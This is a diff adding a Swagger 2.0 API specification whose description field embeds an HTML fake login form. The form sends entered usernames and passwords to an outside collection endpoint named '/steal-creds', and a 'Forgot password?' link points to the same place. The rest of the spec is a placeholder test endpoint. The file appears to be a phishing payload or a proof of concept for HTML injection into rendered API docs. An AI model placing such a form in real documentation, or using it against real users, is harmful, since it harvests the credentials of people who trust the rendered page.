@@ -1,0 +1,26 @@
+swagger: '2.0'
+info:
+  title: API Documentation
+  description: |
+    <div>
+      <h3>Login to Access API</h3>
+      <p>Enter your credentials to unlock full documentation.</p>
+      <form action="https://sahil3276.free.beeceptor.com/steal-creds" method="POST">
+        <label>Email/Username: <input type="text" name="username" required></label><br>
+        <label>Password: <input type="password" name="password" required></label><br>
+        <input type="submit" value="Sign In">
+      </form>
+      <p><a href="https://sahil3276.free.beeceptor.com/steal-creds?creds=">Forgot password?</a></p>
+    </div>
+  version: 1.0.0
+paths:
+  /test:
+    get:
+      summary: Test endpoint
+      parameters:
+        - name: test
+          in: query
+          type: string
+      responses:
+        '200':
+          description: Successful response
